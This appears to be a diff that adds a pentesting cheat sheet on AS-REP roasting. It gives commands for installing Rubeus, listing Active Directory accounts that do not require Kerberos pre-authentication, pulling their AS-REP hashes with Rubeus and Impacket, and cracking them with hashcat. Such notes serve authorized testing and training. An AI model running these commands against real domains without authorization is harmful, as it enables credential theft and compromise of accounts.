@@ -1,0 +1,86 @@
+---
+title: "ASREPRoast"
+---
+
+## How to Install
+
+[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+
+### Clone
+
+```bash
+git clone https://github.com/GhostPack/Rubeus.git
+cd Rubeus
+```
+
+### Compile
+
+```bash
+dotnet build -c Release
+```
+
+### Binary output
+
+```bash
+Rubeus/bin/Release/net462/Rubeus.exe
+```
+
+---
+
+## Kali Linux Package
+
+```bash
+sudo apt install rubeus
+```
+
+```bash
+rubeus -h
+```
+
+```
+rubeus ~ Raw Kerberos interaction and abuses
+```
+
+### Binary location
+
+```
+/usr/share/windows-resources/rubeus/Rubeus.exe
+```
+
+---
+
+## Enumerate vulnerable users
+
+```powershell
+Get-DomainUser -PreauthNotRequired -verbose
+```
+
+---
+
+## Request AS-REP hashes
+
+### Rubeus
+
+```powershell
+.\Rubeus.exe asreproast /nowrap
+```
+
+### Impacket (single user)
+
+```bash
+impacket-GetNPUsers -dc-ip IP-DC -request -outputfile hashes.asreproast DOMAIN/USER
+```
+
+### Impacket (user list)
+
+```bash
+impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip IP-DC -request -format hashcat -outputfile hashes.txt
+```
+
+---
+
+## Crack hashes
+
+```bash
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
